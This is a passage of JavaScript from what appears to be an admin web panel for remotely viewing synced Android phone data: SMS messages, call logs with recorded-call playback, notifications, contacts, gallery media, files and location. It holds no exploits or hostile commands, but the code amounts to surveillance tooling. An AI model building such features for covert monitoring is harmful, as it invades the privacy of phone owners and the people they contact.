        <iframe class="location-map-frame" title="Google Map" loading="lazy" src="${embed}" allowfullscreen></iframe>
      </div>
    </div>`;
  document.getElementById("btn-admin-map-zoom-in")?.addEventListener("click", () => {
    adminLocationMapZoom = Math.min(20, adminLocationMapZoom + 1);
    renderLocationPanel();
  });
  document.getElementById("btn-admin-map-zoom-out")?.addEventListener("click", () => {
    adminLocationMapZoom = Math.max(3, adminLocationMapZoom - 1);
    renderLocationPanel();
  });
}

function flattenInfo(info) {
  if (!info || typeof info !== "object") return {};
  const out = {};
  const walk = (obj, prefix = "") => {
    for (const [k, v] of Object.entries(obj)) {
      if (k === "id" || k === "ownerUid") continue;
      const key = prefix ? `${prefix}.${k}` : k;
      if (v && typeof v === "object" && !Array.isArray(v)) walk(v, key);
      else if (Array.isArray(v)) out[key] = v.slice(0, 8).join(", ");
      else out[key] = v;
    }
  };
  walk(info);
  return out;
}

function renderInfoPanel() {
  const el = document.getElementById("admin-info-body");
  if (!el || !exploreCtx) return;
  const d = exploreCtx.data.device || {};
  const info = flattenInfo(exploreCtx.data.deviceInfo);
  const sessions = exploreCtx.data.activeSessions || [];
  el.innerHTML = `
    <h2 class="settings-section-title" style="margin-top:0;">Device status</h2>
    <div class="admin-kv-grid">
      ${kvRows({
        Name: d.deviceName,
        Model: [d.manufacturer, d.deviceModel].filter(Boolean).join(" "),
        Android: d.androidVersion,
        "App version": d.appVersion,
        Online: d.online,
        "Remote control": d.remoteControlEnabled !== false,
        Battery: d.batteryLevel != null ? `${d.batteryLevel}%` : "—",
        Charging: d.isCharging,
        Network: d.networkType,
        "Last seen": fmtTime(d.lastSeenAt),
        Camera: d.cameraPermission || (d.cameraAvailable !== false ? "ready" : "off"),
        Microphone: d.microphonePermission || (d.microphoneAvailable !== false ? "ready" : "off"),
        "Location sharing": d.locationSharingEnabled,
        Gallery: d.galleryAccessEnabled,
        "File manager": d.fileManagerEnabled,
      })}
    </div>
    <h2 class="settings-section-title">Synced device information</h2>
    ${
      Object.keys(info).length
        ? `<div class="admin-kv-grid">${kvRows(info)}</div>`
        : emptyHint("No cached info yet. Tap Refresh Information, wait, then Refresh.")
    }
    <h2 class="settings-section-title">Active sessions</h2>
    ${
      sessions.length
        ? `<ul class="admin-readable-list">${sessions
            .map(
              (s) =>
                `<li><strong>${escapeHtml(s.sessionKind || "session")}</strong> · ${escapeHtml(s.status || "")} · client ${escapeHtml(s.clientId || "")} · ${fmtTime(s.startedAt || s.createdAt)}</li>`
            )
            .join("")}</ul>`
        : emptyHint("No active sessions.")
    }
  `;
}

function renderGalleryPanel() {
  const el = document.getElementById("admin-gallery-body");
  if (!el || !exploreCtx) return;
  document.querySelectorAll("#admin-gallery-filters .gallery-filter").forEach((btn) => {
    btn.classList.toggle("active", btn.getAttribute("data-gallery-filter") === adminGalleryFilter);
    btn.onclick = () => {
      adminGalleryFilter = btn.getAttribute("data-gallery-filter") || "all";
      renderGalleryPanel();
    };
  });
  document.getElementById("btn-admin-gallery-refresh")?.addEventListener(
    "click",
    () => {
      if (exploreCtx) void openDeviceExplore(exploreCtx.ownerUid, exploreCtx.deviceId);
    },
    { once: true }
  );

  let items = sortNewestFirst(exploreCtx.data.gallery || [], "dateAdded", "createdAt");
  if (adminGalleryFilter !== "all") {
    items = items.filter((g) => String(g.type || "").toLowerCase() === adminGalleryFilter);
  }
  if (!items.length) {
    el.innerHTML = emptyHint(
      "No gallery items cached for this filter. Tap Request index, wait a few seconds, then Refresh."
    );
    return;
  }
  el.innerHTML = `<div class="media-grid">${items
    .slice(0, 80)
    .map((g) => {
      const id = String(g.itemId || g.id || "");
      const name = g.displayName || g.name || id;
      const type = String(g.type || "file").toLowerCase();
      const key = `${exploreCtx.ownerUid}:${exploreCtx.deviceId}:${id}`;
      const st = adminGalleryItemState.get(key);
      let label = "Download";
      let extraClass = "";
      if (st?.status === "downloading") {
        label = `${Math.max(0, Math.min(100, Number(st.progress) || 0))}%`;
        extraClass = " btn-file-progress";
      } else if (st?.status === "ready") {
        label = adminGalleryActionLabel(type, g.mimeType);
        extraClass = " btn-file-ready";
      } else if (st?.status === "error") {
        label = "Retry";
        extraClass = " btn-file-error";
      }
      const progressStyle =
        st?.status === "downloading"
          ? ` style="--file-progress:${Math.max(0, Math.min(100, Number(st.progress) || 0))}%"`
          : "";
      return `<article class="media-card">
        <div class="media-meta"><strong>${escapeHtml(name)}</strong>
        <span>${escapeHtml(type)} · ${Math.round((g.sizeBytes || 0) / 1024)} KB</span>
        <span class="muted">${fmtTime(g.dateAdded || g.createdAt)}</span></div>
        <button type="button" class="btn-secondary btn-admin-gallery-dl${extraClass}"
          data-item-id="${escapeHtml(id)}"
          data-type="${escapeHtml(type)}"
          data-name="${escapeHtml(name)}"
          data-mime="${escapeHtml(g.mimeType || "")}"
          data-size="${Number(g.sizeBytes || 0)}"${progressStyle}
          ${st?.status === "downloading" ? "disabled" : ""}>${escapeHtml(label)}</button>
      </article>`;
    })
    .join("")}</div>`;
  el.querySelectorAll(".btn-admin-gallery-dl").forEach((btn) => {
    btn.addEventListener("click", async () => {
      const item = {
        itemId: btn.getAttribute("data-item-id") || "",
        type: btn.getAttribute("data-type") || "",
        displayName: btn.getAttribute("data-name") || "file",
        mimeType: btn.getAttribute("data-mime") || "",
        sizeBytes: Number(btn.getAttribute("data-size") || 0),
      };
      try {
        await downloadAdminGalleryItem(item, btn);
      } catch (e) {
        alert(formatApiError(e));
      }
    });
  });
  document.getElementById("btn-admin-gallery-inline-close")?.addEventListener(
    "click",
    () => closeAdminGalleryInlineViewer(),
    { once: true }
  );
}

function renderNotificationsPanel() {
  const el = document.getElementById("admin-notifications-body");
  if (!el || !exploreCtx) return;
  document.getElementById("btn-admin-notif-refresh")?.addEventListener(
    "click",
    () => {
      if (exploreCtx) void openDeviceExplore(exploreCtx.ownerUid, exploreCtx.deviceId);
    },
    { once: true }
  );
  const items = sortNewestFirst(exploreCtx.data.notifications || [], "postedAt", "createdAt");
  if (!items.length) {
    el.innerHTML = emptyHint(
      "No notifications cached.\n\nOn the phone: Permissions → Notification access ON, then Sync from phone here."
    );
    return;
  }
  el.innerHTML = `<div class="notif-grid">${items
    .slice(0, 80)
    .map((n) => {
      const title = escapeHtml(n.title || "(No title)");
      const message = escapeHtml(n.message || n.text || n.body || "");
      const app = escapeHtml(n.appLabel || n.appName || n.packageName || "App");
      return `<article class="notif-card">
        <div class="notif-card-head">
          <strong class="notif-title">${title}</strong>
          <time class="notif-time muted">${escapeHtml(fmtTime(n.postedAt || n.createdAt))}</time>
        </div>
        <p class="notif-message">${message || '<span class="muted">(No message text)</span>'}</p>
        <div class="notif-meta muted">${app}</div>
      </article>`;
    })
    .join("")}</div>`;
}

function renderAdminMediaBody(body, { objectUrl, mimeType, displayName, type }) {
  if (!body) return;
  const name = displayName || "file";
  const mime = String(mimeType || "");
  const kind = String(type || "").toLowerCase();
  const safeName = escapeHtml(name);
  if (kind === "image" || mime.startsWith("image/")) {
    body.innerHTML = `<div class="admin-support-zoom-wrap"><img class="admin-support-zoom-img" src="${objectUrl}" alt="${safeName}" draggable="false" /></div>
      <p style="margin-top:10px;"><a class="btn-secondary" href="${objectUrl}" download="${safeName}">Download image</a>
      <span class="muted" style="margin-left:8px;">Scroll to zoom · drag to pan</span></p>`;
    const img = body.querySelector("img");
    const wrap = body.querySelector(".admin-support-zoom-wrap");
    if (img && wrap) bindAdminMediaZoom(wrap, img);
  } else if (kind === "video" || mime.startsWith("video/")) {
    body.innerHTML = `<video controls playsinline preload="metadata" style="width:100%;max-height:70vh;border-radius:12px;background:#0b0d14">
        <source src="${objectUrl}" type="${escapeHtml(mime || "video/mp4")}" />
      </video>
      <p style="margin-top:10px;"><a class="btn-primary" href="${objectUrl}" download="${safeName}">Download video</a></p>`;
  } else if (kind === "audio" || mime.startsWith("audio/")) {
    body.innerHTML = `<audio controls preload="metadata" style="width:100%">
        <source src="${objectUrl}" type="${escapeHtml(mime || "audio/mpeg")}" />
      </audio>
      <p class="muted" style="margin-top:8px;">If playback fails in-browser, use Download (some phone formats need a player app).</p>
      <p style="margin-top:10px;"><a class="btn-primary" href="${objectUrl}" download="${safeName}">Download audio</a></p>`;
  } else {
    body.innerHTML = `<p class="muted">File ready.</p>
      <p><a class="btn-primary" href="${objectUrl}" download="${safeName}">Download file</a></p>`;
  }
}

function bindAdminMediaZoom(wrap, img) {
  let scale = 1;
  let x = 0;
  let y = 0;
  let dragging = false;
  let lastX = 0;
  let lastY = 0;
  const apply = () => {
    img.style.transform = `translate(${x}px, ${y}px) scale(${scale})`;
  };
  wrap.addEventListener(
    "wheel",
    (ev) => {
      ev.preventDefault();
      scale = Math.min(6, Math.max(1, scale + (ev.deltaY < 0 ? 0.2 : -0.2)));
      if (scale === 1) {
        x = 0;
        y = 0;
      }
      apply();
    },
    { passive: false }
  );
  img.addEventListener("pointerdown", (ev) => {
    if (scale <= 1) return;
    dragging = true;
    lastX = ev.clientX;
    lastY = ev.clientY;
    img.setPointerCapture?.(ev.pointerId);
  });
  img.addEventListener("pointermove", (ev) => {
    if (!dragging) return;
    x += ev.clientX - lastX;
    y += ev.clientY - lastY;
    lastX = ev.clientX;
    lastY = ev.clientY;
    apply();
  });
  const end = () => {
    dragging = false;
  };
  img.addEventListener("pointerup", end);
  img.addEventListener("pointercancel", end);
}

async function openAdminGalleryItem(item) {
  if (!exploreCtx || !item?.itemId) return;
  const viewer = document.getElementById("admin-media-viewer");
  const body = document.getElementById("admin-media-body");
  const title = document.getElementById("admin-media-title");
  const status = document.getElementById("admin-media-status");
  const cacheKey = `${exploreCtx.ownerUid}:${exploreCtx.deviceId}:${item.itemId}`;
  show(viewer, true);
  if (title) title.textContent = item.displayName || item.itemId;
  const cached = adminGalleryCache.get(cacheKey);
  if (cached?.objectUrl) {
    renderAdminMediaBody(body, cached);
    if (status) status.textContent = "Loaded from cache.";
    return;
  }
  if (body) body.textContent = "Requesting file from phone…";
  if (status) status.textContent = "Starting transfer…";
  try {
    let transfer = await findReadyAdminGalleryTransfer(
      exploreCtx.ownerUid,
      exploreCtx.deviceId,
      item.itemId
    );
    if (!transfer) {
      const started = await api(
        `/api/admin/users/${encodeURIComponent(exploreCtx.ownerUid)}/devices/${encodeURIComponent(exploreCtx.deviceId)}/gallery/transfer`,
        {
          method: "POST",
          body: JSON.stringify({
            itemId: item.itemId,
            displayName: item.displayName,
            mimeType: item.mimeType,
            sizeBytes: item.sizeBytes,
          }),
        }
      );
      const transferId = started.transfer?.transferId || started.transferId;
      const commandId = started.command?.commandId || null;
      if (!transferId) throw new Error("No transferId returned");
      if (status) status.textContent = "Waiting for phone upload…";
      transfer = await pollAdminGalleryTransfer(
        exploreCtx.ownerUid,
        exploreCtx.deviceId,
        transferId,
        commandId,
        (progress, st) => {
          if (status) {
            status.textContent =
              st === "ready" ? "Ready" : `Status: ${st || "…"} · ${Math.round(Number(progress) || 0)}%`;
          }
        }
      );
    } else if (status) {
      status.textContent = "Loading cached transfer…";
    }
    const blob = await fetchAdminTransferBlob(exploreCtx.ownerUid, transfer);
    const type = String(item.type || "").toLowerCase();
    const mime = String(item.mimeType || transfer.mimeType || blob.type || "");
    const typed =
      mime && (!blob.type || blob.type === "application/octet-stream")
        ? new Blob([blob], { type: mime })
        : blob;
    const objectUrl = URL.createObjectURL(typed);
    const entry = {
      objectUrl,
      mimeType: mime || typed.type || "",
      displayName: item.displayName || transfer.displayName || "file",
      type,
    };
    if (cacheKey) adminGalleryCache.set(cacheKey, entry);
    renderAdminMediaBody(body, entry);
    if (status) status.textContent = "Loaded — play below or download.";
  } catch (e) {
    if (body) body.textContent = formatApiError(e);
    if (status) status.textContent = "";
  }
}

async function openAdminRecording(transferId, displayName) {
  if (!exploreCtx || !transferId) return;
  const viewer = document.getElementById("admin-media-viewer");
  const body = document.getElementById("admin-media-body");
  const title = document.getElementById("admin-media-title");
  const status = document.getElementById("admin-media-status");
  show(viewer, true);
  if (title) title.textContent = displayName || "Screen recording";
  if (body) body.textContent = "Loading recording…";
  if (status) status.textContent = "Fetching file…";
  try {
    const meta = await api(
      `/api/admin/users/${encodeURIComponent(exploreCtx.ownerUid)}/transfers/${encodeURIComponent(transferId)}`
    );
    const t = meta.transfer || {};
    if (String(t.status || "") !== "ready") {
      throw new Error(
        `Recording transfer not ready (${t.status || "unknown"}). Wait for upload to finish, then Refresh.`
      );
    }
    const url = `/api/admin/users/${encodeURIComponent(exploreCtx.ownerUid)}/transfers/${encodeURIComponent(transferId)}/content`;
    const res = await fetch(url, { headers: { Authorization: `Bearer ${idToken}` } });
    if (!res.ok) throw new Error(`Download failed (HTTP ${res.status})`);
    const blob = await res.blob();
    const typed = new Blob([blob], { type: t.mimeType || "video/mp4" });
    const objectUrl = URL.createObjectURL(typed);
    renderAdminMediaBody(body, {
      objectUrl,
      mimeType: "video/mp4",
      displayName: displayName || t.displayName || "recording.mp4",
      type: "video",
    });
    if (status) status.textContent = "Ready to play / download.";
  } catch (e) {
    if (body) body.textContent = formatApiError(e);
    if (status) status.textContent = "";
  }
}

function renderMessagesPanel() {
  const el = document.getElementById("admin-messages-body");
  if (!el || !exploreCtx) return;
  document.getElementById("btn-admin-messages-refresh")?.addEventListener(
    "click",
    () => {
      if (exploreCtx) void openDeviceExplore(exploreCtx.ownerUid, exploreCtx.deviceId);
    },
    { once: true }
  );
  const items = sortNewestFirst(exploreCtx.data.messages || [], "date", "createdAt");
  if (!items.length) {
    el.innerHTML = emptyHint("No messages cached. Tap Sync from phone.");
    return;
  }
  el.innerHTML = `<ul class="admin-readable-list">${items
    .slice(0, 50)
    .map(
      (m) =>
        `<li>
          <strong>${escapeHtml(m.address || m.contactName || "Unknown")}</strong>
          <span class="muted"> · ${escapeHtml(m.type || m.direction || "")}</span>
          <div>${escapeHtml(m.body || m.text || "")}</div>
          <div class="muted">${fmtTime(m.date || m.createdAt)}</div>
        </li>`
    )
    .join("")}</ul>`;
}

function callDayKey(ms) {
  const n = Number(ms || 0);
  if (!n) return "unknown";
  const d = new Date(n);
  if (Number.isNaN(d.getTime())) return "unknown";
  const y = d.getFullYear();
  const m = String(d.getMonth() + 1).padStart(2, "0");
  const day = String(d.getDate()).padStart(2, "0");
  return `${y}-${m}-${day}`;
}

function callDayLabel(dayKey) {
  if (!dayKey || dayKey === "unknown") return "Unknown date";
  const [y, m, d] = dayKey.split("-").map(Number);
  const date = new Date(y, m - 1, d);
  const today = new Date();
  const startToday = new Date(today.getFullYear(), today.getMonth(), today.getDate());
  const startThat = new Date(date.getFullYear(), date.getMonth(), date.getDate());
  const diffDays = Math.round((startToday - startThat) / 86400000);
  const pretty = date.toLocaleDateString(undefined, {
    weekday: "short",
    month: "short",
    day: "numeric",
    year: "numeric",
  });
  if (diffDays === 0) return `Today · ${pretty}`;
  if (diffDays === 1) return `Yesterday · ${pretty}`;
  if (diffDays > 1) return `Previous · ${pretty}`;
  return pretty;
}

function groupCallItemsByDay(items) {
  const groups = new Map();
  for (const it of items || []) {
    const key = callDayKey(it?.date);
    if (!groups.has(key)) groups.set(key, []);
    groups.get(key).push(it);
  }
  return [...groups.entries()].sort((a, b) => {
    if (a[0] === "unknown") return 1;
    if (b[0] === "unknown") return -1;
    return b[0].localeCompare(a[0]);
  });
}

function callTypeLabel(type) {
  const t = String(type || "").toLowerCase();
  const map = {
    incoming: "Incoming",
    outgoing: "Outgoing",
    missed: "Missed",
    voicemail: "Voicemail",
    rejected: "Rejected",
    blocked: "Blocked",
    answered_externally: "Answered elsewhere",
  };
  return map[t] || (t ? t.replace(/_/g, " ") : "Unknown");
}

function callTypeClass(type) {
  const t = String(type || "").toLowerCase();
  if (t === "incoming") return "call-type-incoming";
  if (t === "outgoing") return "call-type-outgoing";
  if (t === "missed") return "call-type-missed";
  if (t === "voicemail") return "call-type-voicemail";
  if (t === "rejected") return "call-type-rejected";
  if (t === "blocked") return "call-type-blocked";
  if (t === "answered_externally") return "call-type-external";
  return "call-type-other";
}

function formatCallDateTime(ms) {
  const n = Number(ms || 0);
  if (!n) return "—";
  try {
    return new Date(n).toLocaleString(undefined, {
      year: "numeric",
      month: "short",
      day: "numeric",
      hour: "numeric",
      minute: "2-digit",
      second: "2-digit",
      hour12: true,
    });
  } catch {
    return String(n);
  }
}

function formatCallDuration(sec) {
  const s = Math.max(0, Number(sec || 0));
  if (!s) return "0s";
  const h = Math.floor(s / 3600);
  const m = Math.floor((s % 3600) / 60);
  const r = s % 60;
  if (h > 0) return `${h}h ${m}m ${r}s`;
  if (m > 0) return `${m}m ${r}s`;
  return `${r}s`;
}

function isAdminCallRecordingPlayable(it) {
  if (!it) return false;
  if (String(it.recordingStatus || "").toLowerCase() !== "ready") return false;
  return Boolean(
    String(it.recordingUrl || "").trim() ||
      String(it.recordingContentUrl || "").trim() ||
      String(it.recordingStoragePath || "").trim()
  );
}

function sniffAdminAudioMime(buf, fallbackMime) {
  const u8 = new Uint8Array(buf);
  if (u8.length >= 5) {
    const head = String.fromCharCode(u8[0], u8[1], u8[2], u8[3], u8[4]);
    if (head.startsWith("#!AMR")) return { mime: "audio/amr", ext: "amr" };
  }
  if (u8.length >= 12 && u8[4] === 0x66 && u8[5] === 0x74 && u8[6] === 0x79 && u8[7] === 0x70) {
    const brand = String.fromCharCode(u8[8], u8[9], u8[10], u8[11]).toLowerCase();
    if (brand.includes("3gp") || brand.includes("3g2")) return { mime: "audio/3gpp", ext: "3gp" };
    return { mime: "audio/mp4", ext: "m4a" };
  }
  if (u8.length >= 12) {
    const riff = String.fromCharCode(u8[0], u8[1], u8[2], u8[3]);
    const wave = String.fromCharCode(u8[8], u8[9], u8[10], u8[11]);
    if (riff === "RIFF" && wave === "WAVE") return { mime: "audio/wav", ext: "wav" };
  }
  if (u8.length >= 3) {
    if (u8[0] === 0x49 && u8[1] === 0x44 && u8[2] === 0x33) return { mime: "audio/mpeg", ext: "mp3" };
    if (u8[0] === 0xff && (u8[1] & 0xe0) === 0xe0) return { mime: "audio/mpeg", ext: "mp3" };
  }
  const fb = String(fallbackMime || "").toLowerCase();
  if (fb.includes("3gpp") || fb.includes("amr")) return { mime: fb || "audio/3gpp", ext: "3gp" };
  if (fb.includes("mpeg") || fb.includes("mp3")) return { mime: "audio/mpeg", ext: "mp3" };
  if (fb.includes("wav")) return { mime: "audio/wav", ext: "wav" };
  if (fb.includes("mp4") || fb.includes("m4a") || fb.includes("aac")) return { mime: "audio/mp4", ext: "m4a" };
  return { mime: fb || "audio/mp4", ext: "m4a" };
}

async function playAdminCallRecording(deviceId, item, buttonEl) {
  if (!exploreCtx) throw new Error("No device context");
  const ownerUid = exploreCtx.ownerUid;
  const itemId = String(item?.itemId || "").trim();
  if (!deviceId || !itemId) throw new Error("Missing call recording id");
  const prev = buttonEl?.textContent;
  if (buttonEl) {
    buttonEl.disabled = true;
    buttonEl.textContent = "Loading…";
  }
  try {
    const contentPath =
      String(item.recordingContentUrl || "").trim() ||
      `/api/admin/users/${encodeURIComponent(ownerUid)}/devices/${encodeURIComponent(deviceId)}/call-logs/recording?itemId=${encodeURIComponent(itemId)}`;
    const res = await fetch(contentPath, {
      headers: idToken ? { Authorization: `Bearer ${idToken}` } : {},
    });
    if (!res.ok) {
      const body = await res.json().catch(() => ({}));
      throw new Error(body.error || `Recording HTTP ${res.status}`);
    }
    const headerMime = String(res.headers.get("content-type") || "").split(";")[0].trim();
    const buf = await res.arrayBuffer();
    if (!buf || buf.byteLength < 64) {
      throw new Error("Recording file is empty or too small");
    }
    const sniffed = sniffAdminAudioMime(buf, headerMime || item.recordingMimeType || "");
    const pathHint = String(item.recordingStoragePath || "").toLowerCase();
    let mime = sniffed.mime;
    let ext = sniffed.ext;
    if (!ext) {
      if (pathHint.endsWith(".3gp")) ext = "3gp";
      else if (pathHint.endsWith(".amr")) ext = "amr";
      else if (pathHint.endsWith(".mp3")) ext = "mp3";
      else if (pathHint.endsWith(".wav")) ext = "wav";
      else ext = "m4a";
    }
    if (!mime || mime === "application/octet-stream") {
      mime =
        ext === "3gp" || ext === "amr"
          ? "audio/3gpp"
          : ext === "mp3"
            ? "audio/mpeg"
            : ext === "wav"
              ? "audio/wav"
              : "audio/mp4";
    }
    const blob = new Blob([buf], { type: mime });
    const objectUrl = URL.createObjectURL(blob);
    const viewer = document.getElementById("admin-media-viewer");
    const body = document.getElementById("admin-media-body");
    const title = document.getElementById("admin-media-title");
    const status = document.getElementById("admin-media-status");
    show(viewer, true);
    if (title) title.textContent = `Call recording · ${item.contactName || item.number || itemId.slice(0, 8)}`;
    if (status) status.textContent = "Tap play below or download if in-browser playback fails.";
    renderAdminMediaBody(body, {
      objectUrl,
      mimeType: mime,
      displayName: `call-${itemId.slice(0, 10)}.${ext}`,
      type: "audio",
    });
  } finally {
    if (buttonEl) {
      buttonEl.disabled = false;
      buttonEl.textContent = prev || "▶ Play";
    }
  }
}

function renderCallLogsHtml(items, deviceId) {
  const groups = groupCallItemsByDay(items);
  return `<div class="call-day-list">${groups
    .map(([dayKey, dayItems], index) => {
      const open = index === 0 ? " is-open" : "";
      const hidden = index === 0 ? "" : " hidden";
      const chevron = index === 0 ? "▲" : "▼";
      const count = dayItems.length;
      return `<section class="call-day-group${open}" data-day="${escapeHtml(dayKey)}">
        <button type="button" class="call-day-header" aria-expanded="${index === 0 ? "true" : "false"}">
          <span class="call-day-title">${escapeHtml(callDayLabel(dayKey))}</span>
          <span class="call-day-count">${count}</span>
          <span class="call-day-chevron" aria-hidden="true">${chevron}</span>
        </button>
        <div class="call-day-body"${hidden}>
          <div class="call-grid">${dayItems
            .map((it) => {
              const type = String(it.callType || it.type || "incoming").toLowerCase();
              const typeLabel = escapeHtml(callTypeLabel(type));
              const typeCls = callTypeClass(type);
              const name = String(it.contactName || "").trim();
              const number = String(it.number || "").trim() || "(unknown)";
              const who = name ? `${escapeHtml(name)} · ${escapeHtml(number)}` : escapeHtml(number);
              const when = escapeHtml(formatCallDateTime(it.date));
              const dur = escapeHtml(formatCallDuration(it.durationSec));
              const geo = String(it.geo || "").trim();
              const playable = isAdminCallRecordingPlayable(it);
              const recStatus = String(it.recordingStatus || "none").toLowerCase();
              const showPlaySlot = type === "incoming" || type === "outgoing";
              let playHtml = "";
              if (showPlaySlot) {
                if (playable) {
                  playHtml = `<button type="button" class="btn-call-play" data-item-id="${escapeHtml(it.itemId || "")}" data-device-id="${escapeHtml(deviceId)}" title="Play call recording">▶ Play</button>`;
                } else if (recStatus === "uploading" || recStatus === "pending") {
                  playHtml = `<span class="call-rec-status call-rec-pending">Uploading…</span>`;
                } else if (recStatus === "failed") {
                  const err = String(it.recordingError || "Upload failed").trim();
                  playHtml = `<span class="call-rec-status call-rec-failed" title="${escapeHtml(err)}">Recording failed${err ? `: ${escapeHtml(err.slice(0, 120))}` : ""}</span>`;
                } else if (Number(it.durationSec || 0) > 0) {
                  playHtml = `<span class="call-rec-status">No recording yet — phone needs Call logs + Phone + Mic, then remake the call</span>`;
                } else {
                  playHtml = `<span class="call-rec-status muted">—</span>`;
                }
              }
              return `<article class="call-card" data-item-id="${escapeHtml(it.itemId || "")}">
          <div class="call-card-head">
            <strong class="call-who">${who}</strong>
            <span class="call-type ${typeCls}">${typeLabel}</span>
          </div>
          <div class="call-meta">
            <time class="call-time">${when}</time>
            <span class="call-duration">Duration ${dur}</span>
            ${geo ? `<span class="call-geo">${escapeHtml(geo)}</span>` : ""}
          </div>
          ${playHtml ? `<div class="call-actions">${playHtml}</div>` : ""}
        </article>`;
            })
            .join("")}</div>
        </div>
      </section>`;
    })
    .join("")}</div>`;
}

function wireAdminCallLogsList(list, items, deviceId) {
  list.querySelectorAll(".call-day-header").forEach((btn) => {
    btn.addEventListener("click", () => {
      const group = btn.closest(".call-day-group");
      const body = group?.querySelector(".call-day-body");
      const chevron = btn.querySelector(".call-day-chevron");
      if (!group || !body) return;
      const opening = body.hasAttribute("hidden");
      if (opening) {
        body.removeAttribute("hidden");
        group.classList.add("is-open");
        btn.setAttribute("aria-expanded", "true");
        if (chevron) chevron.textContent = "▲";
      } else {
        body.setAttribute("hidden", "");
        group.classList.remove("is-open");
        btn.setAttribute("aria-expanded", "false");
        if (chevron) chevron.textContent = "▼";
      }
    });
  });
  list.querySelectorAll(".btn-call-play").forEach((btn) => {
    btn.addEventListener("click", () => {
      const itemId = btn.getAttribute("data-item-id") || "";
      const devId = btn.getAttribute("data-device-id") || deviceId;
      const row = (items || []).find((x) => String(x.itemId) === itemId);
      playAdminCallRecording(devId, row || { itemId }, btn).catch((e) => {
        alert(formatApiError(e));
      });
    });
  });
}

async function refreshAdminCallLogsPanel() {
  const list = document.getElementById("admin-call-logs-body");
  if (!list || !exploreCtx) return;
  const { ownerUid, deviceId } = exploreCtx;
  list.textContent = "Loading call logs…";
  list.classList.add("muted");
  try {
    const data = await api(
      `/api/admin/users/${encodeURIComponent(ownerUid)}/devices/${encodeURIComponent(deviceId)}/call-logs?limit=150`
    );
    const items = data.items || [];
    if (!items.length) {
      list.classList.add("muted");
      list.textContent =
        "No call logs yet.\n\nOn the phone: Permissions → Call logs → allow.\nThen Sync from phone.";
      return;
    }
    list.classList.remove("muted");
    list.innerHTML = renderCallLogsHtml(items, deviceId);
    wireAdminCallLogsList(list, items, deviceId);
  } catch (e) {
    list.classList.add("muted");
    list.textContent = formatApiError(e);
  }
}

function renderCallLogsPanel() {
  const el = document.getElementById("admin-call-logs-body");
  if (!el || !exploreCtx) return;
  const refreshBtn = document.getElementById("btn-admin-call-logs-refresh");
  if (refreshBtn) refreshBtn.onclick = () => void refreshAdminCallLogsPanel();
  void refreshAdminCallLogsPanel();
}

function renderContactsPanel() {
  const el = document.getElementById("admin-contacts-body");
  if (!el || !exploreCtx) return;
  document.getElementById("btn-admin-contacts-refresh")?.addEventListener(
    "click",
    () => {
      if (exploreCtx) void openDeviceExplore(exploreCtx.ownerUid, exploreCtx.deviceId);
    },
    { once: true }
  );
  const items = exploreCtx.data.contacts || [];
  if (!items.length) {
    el.innerHTML = emptyHint("No contacts cached. Tap Sync from phone.");
    return;
  }
  el.innerHTML = `<ul class="admin-readable-list">${items
    .slice(0, 80)
    .map(
      (c) =>
        `<li>
          <strong>${escapeHtml(c.displayName || c.name || "Contact")}</strong>
          <span class="muted"> · ${escapeHtml(c.phone || c.number || (c.phones || [])[0] || "")}</span>
        </li>`
    )
    .join("")}</ul>`;
}

function renderFilesPanel(options = {}) {
  const silent = Boolean(options.silent);
  const el = document.getElementById("admin-files-body");
  if (!el || !exploreCtx) return;
  updateAdminFilesBreadcrumb();
  const folders = exploreCtx.data.folderGrants || [];
  const allEntries = (exploreCtx.data.fileIndex || []).filter(
    (e) => e && (e.name || e.relativePath) && e.count == null
  );
  if (!adminFilesBrowse.grantId && folders[0]?.grantId) {
    adminFilesBrowse.grantId = String(folders[0].grantId || folders[0].id || "");
  }
  const grantId = adminFilesBrowse.grantId || String(folders[0]?.grantId || folders[0]?.id || "");
  const curPath = normalizeAdminFilesPath(adminFilesBrowse.relativePath);
  const entries = allEntries
    .filter((e) => {
      if (grantId && e.folderGrantId && String(e.folderGrantId) !== grantId) return false;
      return adminEntryParentPath(e) === curPath;
    })
    .sort((a, b) => {
      const ad = a.isDirectory ? 0 : 1;
      const bd = b.isDirectory ? 0 : 1;
      if (ad !== bd) return ad - bd;
      return String(a.name || "").localeCompare(String(b.name || ""), undefined, { sensitivity: "base" });
    });
  const renderKey = JSON.stringify({ grantId, curPath, folders: folders.length, entries: entries.length });
  if (silent && renderKey === adminFilesPanelRenderKey && el.querySelector(".files-grid")) return;
  adminFilesPanelRenderKey = renderKey;
  if (!folders.length && !entries.length) {
    el.innerHTML = emptyHint(
      "No shared folders yet. On the phone, grant folder access under Permissions, then tap List folder."
    );
    return;
  }
  el.innerHTML = `
    <h3>Authorized folders</h3>
    <ul>${
      folders.length
        ? folders
            .map(
              (f) =>
                `<li><button type="button" class="btn-secondary btn-admin-grant-root" data-grant="${escapeHtml(f.grantId || f.id || "")}">${escapeHtml(f.displayName || f.name || f.grantId || f.id)}</button> · ${f.connected === false ? "disconnected" : "connected"}</li>`
            )
            .join("")
        : "<li>None — add a folder on the phone Permissions card</li>"
    }</ul>
    <h3>${curPath ? `Contents of ${escapeHtml(curPath)}` : "Files (root)"}</h3>
    ${
      entries.length
        ? `<div class="files-grid">${entries
            .slice(0, 160)
            .map((e, idx) => {
              if (e.isDirectory) {
                return `<button type="button" class="file-card file-folder" data-folder-idx="${idx}">
                  <span class="folder-ico" aria-hidden="true">📁</span>
                  <strong>${escapeHtml(e.name || "")}</strong>
                  <span class="muted">Folder — click to open</span>
                </button>`;
              }
              const key = `adminfile::${exploreCtx.deviceId}::${grantId}::${normalizeAdminFilesPath(e.relativePath || e.name || "")}`;
              const st = adminFilesItemState.get(key);
              let btnLabel = "Download";
              let btnClass = "btn-secondary btn-admin-file-dl";
              if (st?.status === "downloading") {
                btnLabel = `${Math.max(0, Math.min(100, Number(st.progress) || 0))}%`;
                btnClass += " btn-file-progress";
              } else if (st?.status === "ready") {
                btnLabel = "View";
                btnClass += " btn-file-ready";
              } else if (st?.status === "error") {
                btnLabel = "Retry";
                btnClass += " btn-file-error";
              }
              return `<article class="file-card" data-file-idx="${idx}">
                <strong>${escapeHtml(e.name || "")}</strong>
                <span class="muted">${escapeHtml(e.mimeType || "file")} · ${Math.round((e.sizeBytes || 0) / 1024)} KB</span>
                <div class="file-card-actions">
                  <button type="button" class="${btnClass}" data-file-key="${escapeHtml(key)}" data-file-idx="${idx}" ${st?.status === "downloading" ? "disabled" : ""}>${escapeHtml(btnLabel)}</button>
                </div>
              </article>`;
            })
            .join("")}</div>`
